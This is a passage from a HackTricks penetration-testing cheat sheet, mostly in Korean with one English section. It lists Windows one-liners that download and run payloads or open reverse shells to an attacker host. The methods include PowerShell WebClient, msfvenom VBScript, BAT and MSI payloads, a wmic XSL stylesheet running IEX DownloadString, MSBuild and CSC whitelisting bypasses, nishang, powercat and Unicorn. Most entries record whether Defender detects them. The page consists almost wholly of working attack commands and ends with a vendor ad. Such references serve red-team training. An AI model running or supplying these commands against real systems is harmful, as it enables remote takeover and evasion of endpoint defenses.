powershell.exe -c "(New-Object System.NET.WebClient).DownloadFile('http://10.2.0.5:8000/reverse_shell.vbs',\"$env:temp\test.vbs\");Start-Process %windir%\system32\cscript.exe \"$env:temp\test.vbs\""
```
**Cscript - Metasploit**

Cscript is a command-line scripting engine provided by Microsoft. It is commonly used to execute VBScript or JScript scripts on Windows systems. Metasploit, on the other hand, is a popular penetration testing framework that includes various tools and exploits for testing the security of computer systems.

In the context of Metasploit, Cscript can be used as a payload delivery method. By creating a malicious script and executing it using Cscript, an attacker can gain remote access to a target system. This can be achieved by exploiting vulnerabilities or using social engineering techniques to trick the user into running the script.

To use Cscript with Metasploit, you can create a payload using the `msfvenom` tool and specify the output format as a script. For example, you can generate a VBScript payload with the following command:

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker IP> LPORT=<attacker port> -f vbscript -o payload.vbs
```

Once the payload is created, you can transfer it to the target system and execute it using Cscript. This can be done by running the following command on the target system:

```
cscript payload.vbs
```

After executing the payload, the attacker will have a Meterpreter session, which provides a powerful interface for interacting with the compromised system. From here, the attacker can perform various actions, such as executing commands, capturing screenshots, accessing files, and pivoting to other systems on the network.

It is important to note that using Cscript with Metasploit requires proper authorization and should only be performed on systems that you have permission to test. Unauthorized use of these techniques can lead to legal consequences.
```bash
msfvenom -p cmd/windows/reverse_powershell lhost=10.2.0.5 lport=4444 -f vbs > shell.vbs
```
**방어자에 의해 감지됨**

## PS-Bat
```bash
\\webdavserver\folder\batchfile.bat
```
네트워크 호출을 수행하는 프로세스: **svchost.exe**\
디스크에 기록된 페이로드: **WebDAV 클라이언트 로컬 캐시**
```bash
msfvenom -p cmd/windows/reverse_powershell lhost=10.2.0.5 lport=4444 > shell.bat
impacket-smbserver -smb2support kali `pwd`
```

```bash
\\10.8.0.3\kali\shell.bat
```
**방어자에 의해 감지됨**

## **MSIExec**

공격자
```
msfvenom -p windows/meterpreter/reverse_tcp lhost=10.2.0.5 lport=1234 -f msi > shell.msi
python -m SimpleHTTPServer 80
```
피해자:
```
victim> msiexec /quiet /i \\10.2.0.5\kali\shell.msi
```
**감지됨**

## **Wmic**

* [여기에서](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/) 참조하세요.
```bash
wmic os get /format:"https://webserver/payload.xsl"
```
예제 xsl 파일 [여기에서](https://gist.github.com/Arno0x/fa7eb036f6f45333be2d6d2fd075d6a7) 가져온 것입니다:
```xml
<?xml version='1.0'?>
<stylesheet xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt" xmlns:user="placeholder" version="1.0">
<output method="text"/>
<ms:script implements-prefix="user" language="JScript">
<![CDATA[
var r = new ActiveXObject("WScript.Shell").Run("cmd.exe /c echo IEX(New-Object Net.WebClient).DownloadString('http://10.2.0.5/shell.ps1') | powershell -noprofile -");
]]>
</ms:script>
</stylesheet>
```
**감지되지 않음**

**stager wmic을 사용하여 Koadic 좀비를 매우 쉽게 다운로드하고 실행할 수 있습니다.**

## Msbuild

* [여기에서](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/) 다운로드할 수 있습니다.
```
cmd /V /c "set MB="C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe" & !MB! /noautoresponse /preprocess \\webdavserver\folder\payload.xml > payload.xml & !MB! payload.xml"
```
이 기술을 사용하여 응용 프로그램 화이트리스트 및 Powershell.exe 제한을 우회할 수 있습니다. PS 셸로 프롬프트가 표시됩니다.\
다음을 다운로드하고 실행하십시오: [https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj](https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj)
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe MSBuildShell.csproj
```
**감지되지 않음**

## **CSC**

피해자의 컴퓨터에서 C# 코드를 컴파일합니다.
```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /out:shell.exe shell.cs
```
다음에서 기본 C# 역쉘이 포함된 파일을 다운로드할 수 있습니다: [https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc](https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc)

**감지되지 않음**

## **Regasm/Regsvc**

* [여기에서](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /u \\webdavserver\folder\payload.dll
```
**해보지 않았습니다**

[**https://gist.github.com/Arno0x/71ea3afb412ec1a5490c657e58449182**](https://gist.github.com/Arno0x/71ea3afb412ec1a5490c657e58449182)

## Odbcconf

* [여기에서](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
```bash
odbcconf /s /a {regsvr \\webdavserver\folder\payload_dll.txt}
```
**아직 시도해보지 않았습니다**

[**https://gist.github.com/Arno0x/45043f0676a55baf484cbcd080bbf7c2**](https://gist.github.com/Arno0x/45043f0676a55baf484cbcd080bbf7c2)

## Powershell 쉘

### PS-Nishang

[https://github.com/samratashok/nishang](https://github.com/samratashok/nishang)

**Shells** 폴더에는 다양한 쉘들이 있습니다. Invoke-_PowerShellTcp.ps1_을 다운로드하고 실행하려면 스크립트의 사본을 만들고 파일 끝에 추가하십시오:
```
Invoke-PowerShellTcp -Reverse -IPAddress 10.2.0.5 -Port 4444
```
피해자의 컴퓨터에서 스크립트를 실행하기 위해 웹 서버에서 스크립트를 제공합니다:
```
powershell -exec bypass -c "iwr('http://10.11.0.134/shell2.ps1')|iex"
```
Defender는 악성 코드로 감지하지 않습니다 (아직, 2019년 3월 4일).

**TODO: 다른 nishang 쉘 확인**

### **PS-Powercat**

[**https://github.com/besimorhino/powercat**](https://github.com/besimorhino/powercat)

다운로드하고, 웹 서버를 시작하고, 수신자의 끝에서 수신기를 시작하고 실행하세요:
```
powershell -exec bypass -c "iwr('http://10.2.0.5/powercat.ps1')|iex;powercat -c 10.2.0.5 -p 4444 -e cmd"
```
Defender는 악성 코드로 감지하지 않습니다 (아직, 2019년 3월 4일).

**powercat이 제공하는 다른 옵션:**

바인드 쉘, 리버스 쉘 (TCP, UDP, DNS), 포트 리다이렉트, 업로드/다운로드, 페이로드 생성, 파일 제공...
```
Serve a cmd Shell:
powercat -l -p 443 -e cmd
Send a cmd Shell:
powercat -c 10.1.1.1 -p 443 -e cmd
Send a powershell:
powercat -c 10.1.1.1 -p 443 -ep
Send a powershell UDP:
powercat -c 10.1.1.1 -p 443 -ep -u
TCP Listener to TCP Client Relay:
powercat -l -p 8000 -r tcp:10.1.1.16:443
Generate a reverse tcp payload which connects back to 10.1.1.15 port 443:
powercat -c 10.1.1.15 -p 443 -e cmd -g
Start A Persistent Server That Serves a File:
powercat -l -p 443 -i C:\inputfile -rep
```
### Empire

[https://github.com/EmpireProject/Empire](https://github.com/EmpireProject/Empire)

파워셸 런처를 생성하고, 파일에 저장한 후 다운로드하여 실행합니다.
```
powershell -exec bypass -c "iwr('http://10.2.0.5/launcher.ps1')|iex;powercat -c 10.2.0.5 -p 4444 -e cmd"
```
**악성 코드로 감지됨**

### MSF-Unicorn

[https://github.com/trustedsec/unicorn](https://github.com/trustedsec/unicorn)

유니콘을 사용하여 메타스플로잇 백도어의 파워셸 버전을 생성합니다.
```
python unicorn.py windows/meterpreter/reverse_https 10.2.0.5 443
```
생성된 리소스로 msfconsole을 시작합니다:
```
msfconsole -r unicorn.rc
```
피해자에서 _powershell\_attack.txt_ 파일을 서비스하는 웹 서버를 시작하고 실행하세요:
```
powershell -exec bypass -c "iwr('http://10.2.0.5/powershell_attack.txt')|iex"
```
**악성 코드로 감지됨**

## 더 보기

[PS>Attack](https://github.com/jaredhaight/PSAttack) 악성 PS 모듈이 미리로드된 PS 콘솔 (암호화됨)\
[https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f9](https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f93c)[\
WinPWN](https://github.com/SecureThisShit/WinPwn) 악성 PS 모듈과 프록시 감지가 포함된 PS 콘솔 (IEX)

## 참고 자료

* [https://highon.coffee/blog/reverse-shell-cheat-sheet/](https://highon.coffee/blog/reverse-shell-cheat-sheet/)
* [https://gist.github.com/Arno0x](https://gist.github.com/Arno0x)
* [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
* [https://www.hackingarticles.in/get-reverse-shell-via-windows-one-liner/](https://www.hackingarticles.in/get-reverse-shell-via-windows-one-liner/)
* [https://www.hackingarticles.in/koadic-com-command-control-framework/](https://www.hackingarticles.in/koadic-com-command-control-framework/)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
* [https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
​

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

가장 중요한 취약점을 찾아서 빠르게 수정하세요. Intruder는 공격 대상을 추적하고 예방적인 위협 스캔을 실행하여 API부터 웹 앱 및 클라우드 시스템까지 전체 기술 스택에서 문제를 찾습니다. [**무료로 시도해보세요**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) 오늘.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}


<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* HackTricks에서 **회사 광고를 보거나 HackTricks를 PDF로 다운로드**하려면 [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**를** 팔로우하세요.
* **HackTricks**와 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 PR을 제출하여 여러분의 해킹 기법을 공유하세요.

</details>
